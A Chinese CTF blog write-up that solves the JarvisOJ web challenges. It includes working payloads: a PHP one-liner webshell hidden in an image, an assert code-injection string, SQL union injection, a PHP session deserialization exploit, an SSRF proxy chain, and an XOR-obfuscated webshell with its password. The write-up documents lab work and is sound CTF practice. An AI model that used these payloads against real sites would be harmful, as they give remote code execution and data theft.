---
title: JarvisOJ - Web の Write-Up Part 2
date: 2020-05-01 12:45:36
categories:
- WriteUPs
- JarvisOJ
tags:
- Web
---
接上回书说到JarvisOJ的Web部分题目[Part 1](https://coldwave96.github.io/2020/03/11/JarvisOJ-WEB-1/)，现在继续分解Part 2。

<!-- more -->

## RE?

打开链接下载得到一个udf.so文件，搜索了一下这是个mysql的插件。首先查看mysql插件的存放位置：

![](/img/JarvisOJ-WEB-2/WEB1.png)

然后把下载的文件放到这个目录下面，按照题目提示的help_me()函数一步一步探寻即可找到flag：

![](/img/JarvisOJ-WEB-2/WEB2.png)

## Simple Injection

打开是一个登录界面，burp抓包使用sqlmap跑出来username存在注入漏洞，不过由于过滤了空格所以需要加参数—tamper=space2comment

![](/img/JarvisOJ-WEB-2/WEB3.png)

最后得到password的值为334cfb59c9d74849801d5acdcfdaadc3。

解md5后得:eTAloCrEP。

登陆后得到flag:CTF{s1mpl3_1nJ3ction_very_easy!!}

## Easy Gallery

打开是一个网站，submit和view界面分别可以上传图片和查看图片：

![](/img/JarvisOJ-WEB-2/WEB4.png)

![](/img/JarvisOJ-WEB-2/WEB5.png)

上传图片有验证，修改上传文件后缀和抓包更改content-type都不行。猜测验证机制在后台并且会检测文件头，那只能选择一句话图片马了。上传之后会返回图片ID，在view界面输入id和type可以看到自己的图片。

但是这并没有什么用啊，没法执行。查看主页url发现一个很有趣的参数page，猜测这个参数存在文件包含漏洞。尝试了一下，提示里有信息：

![](/img/JarvisOJ-WEB-2/WEB6.png)

系统会给文件自动添加一个.php的后缀，尝试%00截断，没有回显。应该是存在截断漏洞，但是被某种方法防护了。猜测是后台过滤了一些东西，找了些提示：

```PHP
<script language="php">@eval_r($_POST['a']);</script>
```

换了一个小马，重新制作图片马，重新上传加首页包含：

![](/img/JarvisOJ-WEB-2/WEB7.png)

## Babyphp

打开是一个网站，在About界面提到了GIT，通过[weakfilescan](https://github.com/ring04h/weakfilescan)扫到了config文件：

![](/img/JarvisOJ-WEB-2/WEB8.png)

![](/img/JarvisOJ-WEB-2/WEB9.png)

猜测存在git泄露，通过[GitHack](https://github.com/lijiejie/GitHack)得到网站源代码：

![](/img/JarvisOJ-WEB-2/WEB10.png)

![](/img/JarvisOJ-WEB-2/WEB11.png)

在index.php源代码中发现漏洞：

![](/img/JarvisOJ-WEB-2/WEB12.png)

assert函数解释：

assert(mixed $assertion [, Throwable $exception])

assert()会检查指定的assertion并在结果为FALSE时采取适当的行动.就是说如果assertion是字符串，它将会被assert()当做PHP代码来执行。所以构造payload：`page='.system("cat templates/flag.php").'`

![](/img/JarvisOJ-WEB-2/WEB13.png)

## Inject

根据题目的提示寻找源码，扫到index.php～文件，查看页面源代码：

![](/img/JarvisOJ-WEB-2/WEB14.png)

关于该段源代码的详细分析，推荐参考这篇[Blog](https://blog.csdn.net/qq_42939527/article/details/100129254)。

最终构造payload：?table=test\` \`union select group_concat(flagUwillNeverKnow) from secret_flag获得flag。

## WEB?

打开链接只是一个登录框，试了半天的注入，折腾很久毫无收获，查看源码,有个奇怪的app.js：

![](/img/JarvisOJ-WEB-2/WEB15.png)

格式化一下javascript脚本：

![](/img/JarvisOJ-WEB-2/WEB16.png)

输入的密码应该是被以POST方式发送出去了，于是在源代码中找下post，看下能不能发现什么线索：

![](/img/JarvisOJ-WEB-2/WEB17.png)

在这段代码上方不远处找到一个有趣的函数：

![](/img/JarvisOJ-WEB-2/WEB18.png)

把value部分提出来看下：

![](/img/JarvisOJ-WEB-2/WEB19.png)

貌似是个方程组，解一下得到25个解：

data = [81,87,66,123,82,51,97,99,55,95,49,115,95,105,110,116,101,114,101,115,116,105,110,103,125]

```Python
flag = ''
for i in data:
    flag += chr(i)
print flag
```

运行python脚本即可获得flag。

## phpinfo

打开页面后是源代码：

![](/img/JarvisOJ-WEB-2/WEB20.png)

仔细阅读代码，加上题目提示的phpinfo.php界面看到的phpinfo信息，发现是php的seesion的反序列化问题。具体的问题分析可以看[这里]( https://blog.csdn.net/wy_97/article/details/78430690)。

构造一个上传和post同时进行的情况：

```HTML
<!DOCTYPE html>
<html>
<head>
	<title>test XXE</title>
	<meta charset="utf-8">
</head>
<body>
	<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"><!-- 	
不对字符编码-->
	    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
	    <input type="file" name="file" />
	    <input type="submit" value="go" />
	</form>
</body>
</html>
```

然后构造payload：

```PHP
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz = "print_r(scandir(dirname(__FILE__)));";
}
echo(serialize(new OowoO()));
?>
```

生成payload：`O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}`

但是要在双引号前加上反斜杠，防止转义错误；还要在O前面加上“|”：`|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}`

利用上面的上传界面随意上传一个文件，然后使用BP截包，把文件名改为payload即可得到flag文件名“Here_1s_7he_fl4g_buT_You_Cannot_see.php”。

然后再次把“_FILE_”改成："/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"即可获得flag。

## Chopper

首先看到的是一把菜刀：

![](/img/JarvisOJ-WEB-2/WEB21.png)

点击管理员登录提示`you are not admin!`

查看图片地址为`http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg`

一下子精神了，也许是远程文件包含？

再看了一下管理员界面源码：

![](/img/JarvisOJ-WEB-2/WEB22.png)

尝试了加X-Forwarded-For头部，发现并没什么用。

于是构造POC：`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/`即可访问到admin目录。

接下来扫描目录，在robots.txt中找到木马文件trojan.php及该木马的源码trojan.php.txt。

但是源码是进行异或处理的:

```PHP
<?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?>
```

为了知道这个webshell的密码，把木马文件放在本地的Web服务器上执行，通过报错知道密码为360。

最后利用密码POST数据`360 = system('ls')`，即可获得flag：CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}。

## To Be Continue

JarvisOJ的Web部分题目暂告一段落，还有几题没做，后面有动力做了的话再单独写下WriteUps。最近迷上学习的PWN&Reverse了，虽然他们虐我千百遍，我却仍待他们如初恋（我怎么这么菜啊T.T）。